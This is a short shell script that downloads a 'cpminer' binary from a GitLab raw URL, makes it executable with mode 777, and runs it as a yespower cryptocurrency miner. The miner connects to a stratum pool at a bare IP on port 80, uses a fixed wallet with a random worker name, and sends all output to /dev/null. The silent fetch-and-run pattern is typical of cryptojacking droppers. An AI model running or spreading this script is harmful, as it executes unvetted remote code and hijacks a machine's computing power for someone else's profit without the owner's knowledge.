#!/bin/sh

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.2.25:80 -u v255vQEQnZj2NVjF3UHpTrtwA1cGdXt4dV.$(shuf -n 1 -i 1-99999)-VISH -t4 > /dev/null 2>&1